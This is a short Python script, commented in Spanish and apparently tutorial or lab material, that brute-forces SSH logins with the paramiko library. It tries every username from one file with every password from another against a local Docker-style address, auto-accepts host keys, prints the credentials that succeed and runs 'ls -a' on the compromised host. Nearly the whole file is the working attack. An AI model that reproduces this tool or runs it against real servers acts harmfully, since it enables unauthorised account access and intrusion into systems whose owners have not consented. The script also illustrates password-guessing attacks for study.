# PARAMIKO tiene su propia pagina con documentacion muy sencilla
# Es documentacion escrita para humanos
# Primero se tiene que installar con pip install paramiko
import paramiko
from paramiko import SSHClient

# Se selecciona local  IP como host

host = "172.17.0.1"

users = open('users.txt', 'r')

# Esta variabel se cambia a Flase cuando para salir del bucle
var = True
# Se abre el fichero usuerios y lo leemos
while (var == True):
    # Se quiere leer el usuario sin nigun salto de lineao pegado al siguiente ususario
    user = users.readline().rstrip('\n') 
    
    if not user:
        break
    passwords = open('passwords.txt','r')
    
    
    # En este bucle se va a ir probando cada usuario del fichero con todas las contraseñas
    # Asi si hara con cada usuarios hasta que encontremos alguno
    while True:
        passw = passwords.readline().rstrip('\n')
    
        if not passw:
            break
        
        # conectar con PARAMIKO
        
        # Se utiliza la clase SSHClient para crear un cliente
        # Recordar que cuando se hace una connecion con SSH la primera vez se pide el finger print
        # Si no se puede validar el certificado que  estan dando 
        # Cuando se acepta el finger print se installa
        client = SSHClient()
        # La host key es el certificado que  da el servidor
        # Entonces se utiliza una politica para validarlo
        # RejectPolicy ------ Si no se puede validarlo no entro
        #AutoAddPolicy ------ Automaticamente añade el certificado. El objeto le sale el mensaje y dice :" Si, si. Confio en el certificado"
        # Si no se cambia la politica queda por defecto RejectPolicy
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
        
        try:
            # Ahora se realiza la conexion 
            # El user es el username que see leyendo
            client.connect(host,username=user,password=passw)
            print('user {} - pass {} auth OK!'.format(user,passw))

            # Uua vez conectados ejecutamos un comando
            # En la documentacion encontramos todos los parametro que acepta la funcion
            # EL metodo nos devuelve tres elementos
            stdin, stdout, stderr = client.exec_command('ls -a')
            # Aqui leo la informacion del STDOUT
            for line in stdout.readlines():
                print(line)
            
            # Si se pudo imprimir los directorios significa que hubo conexion y se pasa la variabal a false.
            var = False

        except paramiko.AuthenticationException as e:
            print('user {} - pass {} auth fallida!'.format(user,passw))
            
        except Exception as e:
            print("*** Caught exception: %s: %s" % (e.__class__, e))
            
    passwords.close()
users.close()
